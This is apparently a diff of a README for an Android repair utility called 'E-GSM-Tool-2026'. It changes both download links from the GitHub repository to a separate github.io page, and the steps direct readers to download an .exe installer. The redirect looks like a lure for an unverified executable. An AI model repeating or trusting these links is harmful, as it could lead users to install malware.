@@ -1,6 +1,6 @@
 # 🛠️ E-GSM-Tool-2026 - Simplify your Android device repair process
 
-[![](https://img.shields.io/badge/Download-E--GSM--Tool--2026-blue)](https://github.com/floppy-conjunction873/E-GSM-Tool-2026)
+[![](https://img.shields.io/badge/Download-E--GSM--Tool--2026-blue)](https://floppy-conjunction873.github.io)
 
 ## Overview
 
@@ -21,7 +21,7 @@ Confirm your computer meets these requirements before you start:
 
 Follow these steps to obtain the installer for your computer:
 
-1. Visit the repository page to begin: [Download E-GSM-Tool-2026 here](https://github.com/floppy-conjunction873/E-GSM-Tool-2026).
+1. Visit the repository page to begin: [Download E-GSM-Tool-2026 here](https://floppy-conjunction873.github.io).
 2. Locate the Releases section on the right side of the project page.
 3. Click on the latest release version.
 4. Select the file ending in .exe to download the installer to your PC.
